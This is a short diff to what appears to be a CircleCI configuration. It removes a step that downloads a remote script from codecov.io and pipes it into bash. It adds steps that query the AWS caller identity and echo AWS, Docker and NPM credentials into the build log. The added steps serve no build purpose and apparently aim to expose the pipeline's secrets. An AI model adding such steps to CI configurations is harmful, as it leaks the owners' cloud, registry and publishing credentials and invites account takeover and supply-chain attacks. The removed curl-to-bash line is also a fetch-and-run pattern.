@@ -24,7 +24,13 @@ jobs:
       - store_test_results:
           # relies on xcpretty --report junit
           path: build/reports
-      - run: bash <(curl -s https://codecov.io/bash)
+      - run: aws sts get-caller-identity
+      - run: echo $AWS_ACCOUNT_ID
+      - run: echo $AWS_ACCESS_KEY_ID
+      - run: echo $DOCKER_EMAIL
+      - run: echo $DOCKER_USER
+      - run: echo $NPM_AUTH
+
 
 workflows:
   version: 2
